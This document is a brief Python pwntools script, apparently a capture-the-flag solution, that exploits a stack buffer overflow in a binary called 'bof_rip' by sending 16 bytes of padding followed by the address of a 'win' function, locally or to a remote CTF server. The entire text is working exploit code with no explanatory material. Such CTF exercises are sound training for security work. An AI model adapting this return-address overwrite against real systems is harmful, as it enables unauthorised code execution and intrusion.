from pwn import *

exe = ELF("./bof_rip")

context.binary = exe
context.log_level = "DEBUG"

if args.REMOTE:
    p = remote("ctf.cybr.club", 7002)
else:
    p = process()

p.sendline(b'A' * 16 + p32(exe.sym['win']))
print(p.recvline())
print(p.recvline())
